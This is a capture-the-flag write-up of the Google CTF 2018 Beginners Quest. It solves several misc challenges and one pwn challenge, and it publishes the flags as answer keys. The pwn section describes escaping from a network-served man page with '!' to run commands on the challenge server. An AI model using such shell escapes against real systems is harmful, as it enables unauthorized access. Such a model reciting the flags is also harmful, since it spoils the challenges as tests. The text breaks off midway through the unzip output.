---
layout: article
title: Google CTF - Beginners Quest 2018
permalink: /ctfs/google-ctf-beginners-quest-2018
key: page-aside
aside:
  toc: true
---

Walk-through of Google CTF: Beginners Quest 2018

<!--more-->

## Overview

In 2016, Google began hosting annual CTF competitions to grow the security community, engage security hobbyists and professionals globally, and encourage the community to help protect web users.

Google CTF 2018 included a beginner-friendly quest line that provided newer community members a lighter exposure to the field of security.

The following post provides a walk-through of solutions for these challenges using a Kali box.

To reach the end, we can take one of several different paths from the beginning, encountering different "categories" of challenges along the way as indicated by the different colored circles.

<b>Categories:</b><br>
<span style="color:#FF84FC">**misc**</span><br>
<span style="color:green">**pwn**</span><br>
<span style="color:#66B2FF">**web**</span><br>
<span style="color:#F7C550">**reverse engineering**</span>

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/01.png" alt="" class="center">

Below the map, we are provided some poetic lore...
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/02.png" alt="" class="center">

> Cakes... Throughout history they are long promised, not often delivered. Are they real?

>Are they fabrications of an internal system long designed to tease and tempt you with promises of sweet confectionary goodness that will satisfy and delight? Or the realistic truth of the matter. A dark conspiracy involving many clandestine organisations that want to create content and context around the very existence of this delicacy.

>Your task, uncover the truth, find the cake and show it to the world. Set the truth free.

>You do not have to start this undermining of the Cake-World-Order (cWo) without any information. Our informants deep in the field (some no longer with us), have passed on intel about an operative within the cWo known as Wintermuted. Their home is a mess of old technologies, poor Operational Security (Op-Sec) and Internet of Things (IoT) devices that haven't seen updates in decades, despite being released last year. Start with their rubbish bin! Surely there is a letter or toothpaste tube there with some information that'll get you on the inside.
Your goal is to get the cake in the fridge... Where else would you put cake in your smart home?



## Letter - misc

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/03.png" alt="" class="center">

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/04.png" alt="" class="center">

For this challenge, we're given an attachment to download. The snippet hints at some credentials that need to be extracted. When we click download, we get a sha256 hash as a filename. We can confirm this by either taking an educated guess based on the number of digits, or directly querying <code>hash-identifier</code>. We can also confirm the sha256 hash using <code>sha256sum</code>. Here, the second field in the <code>sha256</code> output is actually the filename.

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/05.png" alt="" class="center">

```bash
root@kali:~/google-ctf-2018/letter# ls
5a0fad5699f75dee39434cc26587411b948e0574a545ef4157e5bf4700e9d62a

root@kali:~/google-ctf-2018/letter# echo -ne 5a0fad5699f75dee39434cc26587411b948e0574a545ef4157e5bf4700e9d62a | wc -m
64

root@kali:~/google-ctf-2018/letter# sha256sum 5a0fad5699f75dee39434cc26587411b948e0574a545ef4157e5bf4700e9d62a 
5a0fad5699f75dee39434cc26587411b948e0574a545ef4157e5bf4700e9d62a  5a0fad5699f75dee39434cc26587411b948e0574a545ef4157e5bf4700e9d62a
```

We can check that the file is a <b>zip</b> file containing a pdf. If we open the pdf, we get a document with credentials. Unfortunately, the credentials are covered with black blocks.

```bash
root@kali:~/google-ctf-2018/letter# file 5a0fad5699f75dee39434cc26587411b948e0574a545ef4157e5bf4700e9d62a 
5a0fad5699f75dee39434cc26587411b948e0574a545ef4157e5bf4700e9d62a: Zip archive data, at least v2.0 to extract

root@kali:~/google-ctf-2018/letter# mv 5a0fad5699f75dee39434cc26587411b948e0574a545ef4157e5bf4700e9d62a 5a0fad5699f75dee39434cc26587411b948e0574a545ef4157e5bf4700e9d62a.zip

root@kali:~/google-ctf-2018/letter# unzip 5a0fad5699f75dee39434cc26587411b948e0574a545ef4157e5bf4700e9d62a.zip 
Archive:  5a0fad5699f75dee39434cc26587411b948e0574a545ef4157e5bf4700e9d62a.zip
 extracting: challenge.pdf           

root@kali:~/google-ctf-2018/letter# ls
5a0fad5699f75dee39434cc26587411b948e0574a545ef4157e5bf4700e9d62a.zip  challenge.pdf

root@kali:~/google-ctf-2018/letter# file challenge.pdf 
challenge.pdf: PDF document, version 1.5

root@kali:~/google-ctf-2018/letter# firefox challenge.pdf
```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/06.png" alt="" class="center">

We can work around this by dumping the text of the pdf to a file or by selecting the text in a pdf viewer and copying it into a text editor.

```bash
root@kali:~/google-ctf-2018/letter# pdftotext challenge.pdf 

root@kali:~/google-ctf-2018/letter# ls
5a0fad5699f75dee39434cc26587411b948e0574a545ef4157e5bf4700e9d62a.zip  challenge.pdf  challenge.txt

root@kali:~/google-ctf-2018/letter# cat challenge.txt
Fake Name
Fake Address
Fake City

A couple of days ago

IOT Credentials

Dear Customer,
Thanks for buying our super special awesome product, the Foobarnizer 9000!
Your credentials to the web interface are:
● Username:​...........................
● Password: ​CTF{ICanReadDis}
Note​: For security reasons we cannot change your password. Please store them safely.

```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/07.png" alt="" class="center">

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/08.png" alt="" class="center">

### Solution
<b>CTF{ICanReadDis}</b>

<br>
<br>
## OCR is Cool! - misc

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/09.png" alt="" class="center">

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/10.png" alt="" class="center">

For this challenge, we're given another attachment to download. When we click download, we get another sha256 hash as a filename. Running <code>file</code> on the file triggers a deeper sense of deja vu; we have another zip folder. Within the zip folder, we find a png screenshot of a Gmail message, but the text seems to be obfuscated. 

```bash
root@kali:~/google-ctf-2018/ocr-is-cool# file 7ad5a7d71a7ac5f5056bb95dd326603e77a38f25a76a1fb7f7e6461e7d27b6a3 
7ad5a7d71a7ac5f5056bb95dd326603e77a38f25a76a1fb7f7e6461e7d27b6a3: Zip archive data, at least v2.0 to extract

root@kali:~/google-ctf-2018/ocr-is-cool# mv 7ad5a7d71a7ac5f5056bb95dd326603e77a38f25a76a1fb7f7e6461e7d27b6a3 7ad5a7d71a7ac5f5056bb95dd326603e77a38f25a76a1fb7f7e6461e7d27b6a3.zip

root@kali:~/google-ctf-2018/ocr-is-cool# unzip 7ad5a7d71a7ac5f5056bb95dd326603e77a38f25a76a1fb7f7e6461e7d27b6a3.zip 
Archive:  7ad5a7d71a7ac5f5056bb95dd326603e77a38f25a76a1fb7f7e6461e7d27b6a3.zip
 extracting: OCR_is_cool.png

root@kali:~/google-ctf-2018/ocr-is-cool# ls
7ad5a7d71a7ac5f5056bb95dd326603e77a38f25a76a1fb7f7e6461e7d27b6a3.zip  OCR_is_cool.png

root@kali:~/google-ctf-2018/ocr-is-cool# xdg-open OCR_is_cool.png 
```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/11.png" alt="" class="center">

If we revisit the challenge prompt, it alludes to Caesar's assassination, but the phrase seems a little out of context. Perhaps the inclusion of Caesar's name is actually a challenge hint. Caesar's Cipher ring a bell?

To test our theory, we need to convert the png text to plaintext first. We can use <a href="https://github.com/tesseract-ocr/tesseract" target="_blank">Tesseract OCR</a> for the job. 

```
root@kali:~/google-ctf-2018/ocr-is-cool# tesseract OCR_is_cool.png OCR_is_cool
Tesseract Open Source OCR Engine v4.0.0-beta.4-50-g07acc with Leptonica
Warning. Invalid resolution 0 dpi. Using 70 instead.
Estimating resolution as 122

root@kali:~/google-ctf-2018/ocr-is-cool# cat OCR_is_cool.txt

[truncated]

Your iDropDrive is ready inbox x ea.

Q ropDrive team <iDropDrive@ctfcompetition.com> Jun 23,2018,9:08AM XY ®t
tome +
Wot Vnimnt,

Px tkx atiir mh pxevhfx tl hnk gxpxim vnimbfxk hy hnk Ixvnkx bWkhiWkbox vehnw ybex latkbgz Ixkobyx. T Ityx letvx yhk tee rhnk ybexl.

Lmhkx tgr ybex
bWkhiWkbox Imtkml rhn pbma 15 IU hy ykex hgebgx hk hyyebgx imhktzx, Ih rhn vig dx ptkes, ubgtkbxt, itgmbgz!, yetz!, ybkfptkxl, ubmvhbgl, pkbmxnil ~ tgrmabgz.

Lox rhnk Imnyy tgrpaxkx
Rhnk ybex! bg bWkhiWkbox vig ux kxtvaxw ykhf tgr yhhutgbsxk, Iftkm ykbwzx 2000, Iftkm atnl, Mxfih-t-ftmby, hk fewbt iv. Lh paxkxoxk rhn zh, thnk ybex! yheehp.

Latkx ybex! tgw yhewxkl
Rhn vig jnbvder bgobmx hmaxk! mh obxp, whpgehtw, tgw vheetuhktmx hg tee max ybex\ rhn ptgm obt xftbe tmmtvafxgml. Cnim zbox maxf max ebgd VMY{vtxitkvbiaxkbltinulmbmnmbhgvbiaxk} tw maxr vig twvxll tee rhnk wtmt.

Ynk xgtfiex, axkx' t ebim hy ybex! matm rhn’kx vnkkxgmer Imhkbgz pbma ni:

hyyanu_ybkfptkx.ubg ‘ChagMK

BHIM_vkxwxgmbtel.iwy\ \(wxexmsxw\) Pagmxkinmxw

Yhhutgbsxk9000_Fignte.iwy — Phgmxkinmxw

yhh.bvh Mnkuh

Lbgyx px mtdx ixvnkbmr oxkr Ixkbhnier tgw bg hkwxk mh ikhmxvm rhn tztbgim onegxktubebmbx! ebdx xytbe tgw tiwyetpl, px’kx Ixgwhgz rhn thnk vixwxgmbtel nlbgz max mbfx-ikhoxg febmtkr-zktwx vixltk Irffxmkbv vbiaxk,

Atiir bWkhiWkbobgz!

* Reply ™® Forward
```

<code>tesseract</code> isn't perfect but it's not bad at all considering the size of the text in the screenshot. The section we're concerned with is whatever is between the brackets "{" and "}".

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/12.png" alt="" class="center">

Below, the top line represents the <code>tesseract</code> output and the bottom line is what the screenshot actually reads -- a difference of only two letters.<br>
VMY{vtxitkvbiaxkbltinulmbmnmbhgvbiaxk}<br>
VMY{vtx<span style="color:red">l</span>tkvbiaxkblt<span style="color:red">l</span>nulmbmnmbhgvbiaxk}


If our previous solution is any indicator of the format for this challenge's solution, we'll likely see that VMY converts to CTF if we run this text through a Caesar's Cipher decoder. Any online decoder will do. We can start testing different letter shift variations on the text. In this case, we get an output that looks suspiciously familiar using <a href="https://cryptii.com/pipes/caesar-cipher" target="_blank">https://cryptii.com/pipes/caesar-cipher</a> with a seven letter shift.
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/13.png" alt="" class="center">
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/14.png" alt="" class="center">
<br>
<br>
It turns out we have to capitalize the ctf prefix to "CTF{...}", but our solution should work after a minor adjustment.

### Solution
<b>CTF{caesarcipherisasubstitutioncipher}</b>

<br>
<br>
## Floppy - misc

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/15.png" alt="" class="center">
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/16.png" alt="" class="center">
<br>
<br>
This challenge's zip file contains an <b>.ico</b> file. 

```bash
root@kali:~/google-ctf-2018/floppy# unzip 4e69382f661878c7da8f8b6b8bf73a20acd6f04ec253020100dfedbd5083bb39.zip 
Archive:  4e69382f661878c7da8f8b6b8bf73a20acd6f04ec253020100dfedbd5083bb39.zip
 extracting: foo.ico

root@kali:~/google-ctf-2018/floppy# file foo.ico 
foo.ico: MS Windows icon resource - 1 icon, 32x32, 16 colors

root@kali:~/google-ctf-2018/floppy# xdg-open foo.ico 
```
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/17.png" alt="" class="center"><br>
Read about <a href="https://en.wikipedia.org/wiki/Borland" target="_blank">Borland</a>.
<br>
<br>
Running <code>binwalk</code> on foo.ico reveals some embedded zip files which we can extract. 

```bash
root@kali:~/google-ctf-2018/floppy# binwalk foo.ico

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
765           0x2FD           Zip archive data, at least v2.0 to extract, compressed size: 123, uncompressed size: 136, name: driver.txt
956           0x3BC           Zip archive data, at least v2.0 to extract, compressed size: 214, uncompressed size: 225, name: www.com
1392          0x570           End of Zip archive

root@kali:~/google-ctf-2018/floppy# mv foo.ico foo.zip

root@kali:~/google-ctf-2018/floppy# unzip foo.zip 
Archive:  foo.zip
warning [foo.zip]:  765 extra bytes at beginning or within zipfile
  (attempting to process anyway)
  inflating: driver.txt              
  inflating: www.com  
```
<br>
Inside the zip file, we find <b>driver.txt</b> and <b>www.com</b>. The <a href="https://en.wikipedia.org/wiki/COM_file" target="_blank">COM</a> extension is a binary executable file format originally used in <a href="https://en.wikipedia.org/wiki/CP/M" target="_blank">CP/M</a> and <a href="https://en.wikipedia.org/wiki/DOS" target="_blank">DOS</a>. We won't need to deal with the COM file for now.


```
root@kali:~/google-ctf-2018/floppy# ls
4e69382f661878c7da8f8b6b8bf73a20acd6f04ec253020100dfedbd5083bb39.zip  driver.txt  foo.zip  www.com

root@kali:~/google-ctf-2018/floppy# cat driver.txt
This is the driver for the Aluminum-Key Hardware password storage device.
     CTF{qeY80sU6Ktko8BJW}

In case of emergency, run www.com
```
### Solution
<b>CTF{qeY80sU6Ktko8BJW}</b>

<br>
<br>
## Moar - pwn

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/18.png" alt="" class="center">
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/19.png" alt="" class="center">

This challenge begins with a prompt that tells us to connect to <b>moar.ctfcompetition.com</b> on port 1337 using <code>nc</code>. According to the prompt, the server serves <code>man</code> pages.

Upon connection, we are indeed presented with the manual for <code>socat</code>, a utility that manages two bidirectional byte streams, commonly used as a networking tool. <a href="http://www.dest-unreach.org/socat/doc/socat.html#EXAMPLES" target="_blank">Socat</a> has been regarded as a <code>netcat</code> on steroids on many occasions, and it's worth checking out why.

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/20.png" alt="" class="center">
<br>
<br>
<code>man</code> enables users to execute commands from within the pages by prepending them with <code>!</code>. Below we have a sequence of <code>ls</code>commands that leads us to <b>/home/moar/disable_dmz.sh</b>.
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/21.png" alt="" class="center">
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/22.png" alt="" class="center">
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/23.png" alt="" class="center">
<br>
<br>
Within <b>/home/moar/disable_dmz.sh</b>, we find the key to our challenge.
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/24.png" alt="" class="center">


### Solution
<b>CTF{SOmething-CATastr0phic}</b>

<br>
<br>
## Floppy2 - misc

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/25.png" alt="" class="center">
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/26.png" alt="" class="center">

This challenge is a continuation of Floppy, one of our prior challenges. We're told to investigate the www.com file we received in the zip folder from Floppy. When we run <code>cat</code> on the www.com file, we see some text and Ascii gibberish. Running the executable on <code>dosbox</code> doesn't provide anything interesting either.

```
root@kali:~/google-ctf-2018/floppy2# file www.com
www.com: ASCII text, with CR, LF line terminators

root@kali:~/google-ctf-2018/floppy# cat www.com
The Foobanizer9000 is no longer on the OffHub DMZ.          $)I!hSLX4SI!{p*S:eTM'~_?o?V;m;CgAA]Ud)HO;{ l{}9l>jLLP[-`|0gvPY0onQ0geZ0wY5>D0g]h+(X-k&4`P[0/,64"P4APG

root@kali:~/google-ctf-2018/floppy# apt install dosbox

root@kali:~/google-ctf-2018/floppy# cp -r _foo.zip.extracted/ ../floppy2

root@kali:~/google-ctf-2018/floppy# cd ../floppy2

root@kali:~/google-ctf-2018/floppy2# ls
2FD.zip  driver.txt  www.com

root@kali:~/google-ctf-2018/floppy2# dosbox
```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/27.png" alt="" class="center">
<br>
<br>
Our output is the same line without the extra Ascii. What happened to the Ascii? If we attempt to redirect the output of the .com file to a .txt file and read it from console, we still don't get anything.
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/28.png" alt="" class="center">
<br>
<br>
However, running <code>cat -v</code>, which prints non-printable characters, reveals the flag we're looking for.

```bash
root@kali:~/google-ctf-2018/floppy2# file WWW.TXT
WWW.TXT: data

root@kali:~/google-ctf-2018/floppy2# cat -v WWW.TXT 
CTF{g00do1dDOS-FTW}^M^M^M^M^NII4^?\^Mp5K^RW=^N^M)^VP[-`|0gvPY0onQ0geZ0wY5>D0g]h+(X-k&4`P[0/,64"P4APM-C^MThe Foobanizer9000 is no longer on the OffHub DMZ.          
```
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/29.png" alt="" class="center">

As an alternative, some participants ran WWW.COM through a debugger and noticed the binary decoding and writing to memory using <code>mov</code> and <code>xor</code> instructions. Using <a href="https://sites.google.com/site/pcdosretro/enhdebug" target="_blank">Enhanced DEBUG</a>, we can dump memory and reveal the written contents.

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/30.png" alt="" class="center">

<br>
<br>
### Solution
<b>CTF{g00do1dDOS-FTW}</b>

<br>
<br>
## Security by Obscurity - misc

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/31.png" alt="" class="center">
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/32.png" alt="" class="center">

The prompt for this challenge mentions the name "John" several times and alludes to a package key. This is reminiscent of the well known password cracker, <b>John the Ripper</b> aka <code>john</code>. If the name serves as a hint for the challenge, we might want to look out for anything related to passwords.

Upon unzipping the attachment for this challenge, we see new nested zip files within each folder. Who knows how long we will spend unzipping the files. It might benefit us to use a short script to automate the unzipping.

```bash
root@kali:~/google-ctf-2018/security-by-obscurity# ls
2cdc6654fb2f8158cd976d8ffac28218b15d052b5c2853232e4c1bafcb632383

root@kali:~/google-ctf-2018/security-by-obscurity# file 2cdc6654fb2f8158cd976d8ffac28218b15d052b5c2853232e4c1bafcb632383 
2cdc6654fb2f8158cd976d8ffac28218b15d052b5c2853232e4c1bafcb632383: Zip archive data, at least v2.0 to extract

root@kali:~/google-ctf-2018/security-by-obscurity# mv 2cdc6654fb2f8158cd976d8ffac28218b15d052b5c2853232e4c1bafcb632383 2cdc6654fb2f8158cd976d8ffac28218b15d052b5c2853232e4c1bafcb632383.zip

root@kali:~/google-ctf-2018/security-by-obscurity# unzip 2cdc6654fb2f8158cd976d8ffac28218b15d052b5c2853232e4c1bafcb632383.zip 
Archive:  2cdc6654fb2f8158cd976d8ffac28218b15d052b5c2853232e4c1bafcb632383.zip
 extracting: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p  

root@kali:~/google-ctf-2018/security-by-obscurity# file password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p 
password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p: Zip archive data, at least v2.0 to extract

root@kali:~/google-ctf-2018/security-by-obscurity# mv password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.zip

root@kali:~/google-ctf-2018/security-by-obscurity# unzip password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.zip 
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.zip
  inflating: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o  

root@kali:~/google-ctf-2018/security-by-obscurity# ls
2cdc6654fb2f8158cd976d8ffac28218b15d052b5c2853232e4c1bafcb632383.zip
password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o
password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.zip

root@kali:~/google-ctf-2018/security-by-obscurity# file password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o
password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o: Zip archive data, at least v2.0 to extract
```

We'll write a short bash script to automate the unzipping process.

<b>nested-unzipper</b>
```bash
#!/bin/bash

while [ "`file * | grep -i "Zip archive"`" ]; do
    for file in `file * | grep -i "Zip archive" | cut -d ':' -f1`; do
        mv $file $file.zip
        unzip $file.zip
        rm $file.zip
    done    
done

```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/33.png" alt="" class="center">
<br>
<br>
Executing the script results in the following output. Our unzipper halts when we no longer have any Zip archives. 

```bash
root@kali:~/google-ctf-2018/security-by-obscurity# ./nested-unzipper
Archive:  2cdc6654fb2f8158cd976d8ffac28218b15d052b5c2853232e4c1bafcb632383.zip
 extracting: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p  
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.zip
  inflating: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o  
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.zip
  inflating: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n  
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.zip
  inflating: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m  
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.zip
  inflating: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l  
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.zip
  inflating: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k  
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.zip
  inflating: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j  
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.zip
  inflating: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i  
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.zip
  inflating: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h  
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.zip
  inflating: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g  
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.zip
  inflating: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f  
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.zip
  inflating: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e  
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.zip
  inflating: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d  
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.zip
  inflating: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c  
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.zip
